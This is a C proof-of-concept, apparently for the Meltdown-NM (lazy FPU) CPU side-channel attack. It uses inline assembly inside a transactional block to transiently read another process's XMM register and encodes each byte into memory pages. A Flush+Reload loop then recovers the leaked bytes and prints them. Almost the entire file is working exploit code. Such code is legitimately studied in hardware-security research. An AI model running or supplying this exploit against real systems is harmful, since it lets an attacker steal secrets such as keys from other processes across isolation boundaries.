#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "libcache/cacheutils.h"
#include "secret.h"

int main(void) {
  pagesize = sysconf(_SC_PAGESIZE);  
  mem = (char*) malloc( pagesize * 256 );
  memset(mem, 1, pagesize * 256);
  // Detect cache threshold  
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);  

  // Flush our shared memory
  flush_shared_memory();

  printf("Output legend:\n");
  printf("  '%c'.....Works\n", SECRET);
  
  for(int r = 0; r < 1000000; r++) {
    if(try_start()) {
      // Encode the data from the AVX register of the other process in the cache
      asm volatile("1:\n"                                                          \
               "movq (%%rsi), %%rsi\n"                                         \
               "movq %%xmm0, %%rax\n"                                         \
               "shl $12, %%rax\n"                                              \
               "jz 1b\n"                                                       \
               "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
               :                                                               \
               : "b"(mem), "S"(0)                                   \
               : "rax");
      try_abort();
    }
    try_end();

    // Recover data from the cache
    for(int i = 0; i < 256; i++) {
      int mix_i = ((i * 167) + 13) % 256;
      if (mix_i != 0 && flush_reload(mem + mix_i * pagesize)) {
        printf("%c ", mix_i);
        fflush(stdout);
      }
    }
  }

  printf("Meltdown-NM done!\n");
  free(mem);

  return EXIT_SUCCESS;
}
